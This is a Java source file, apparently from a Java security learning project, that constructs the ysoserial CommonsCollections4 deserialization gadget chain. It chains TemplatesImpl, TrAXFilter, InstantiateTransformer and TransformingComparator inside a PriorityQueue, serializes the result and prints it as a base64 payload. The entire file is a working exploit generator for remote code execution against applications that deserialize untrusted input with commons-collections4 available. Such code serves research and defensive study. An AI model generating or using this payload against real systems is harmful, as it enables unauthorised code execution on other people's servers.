package com.pacemrc.javasec.deserialize.ysoserial;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.PriorityQueue;

import com.pacemrc.javasec.utils.*;


/**
 * commons-collections4
 */
public class CC4 {


    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = Sinks.getTemplatesImplSink();

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), instantiateTransformer };

        ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        Reflections.setFieldValue(transformingComparator,"transformer",chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(priorityQueue);
        oos.close();
        bos.close();

        byte[] bytes = bos.toByteArray();
        String s = Base64.getEncoder().encodeToString(bytes).replaceAll("\\+","-");
        System.out.println(s);

//        Deserialize.doSerialAndDeserial(priorityQueue);
    }
}
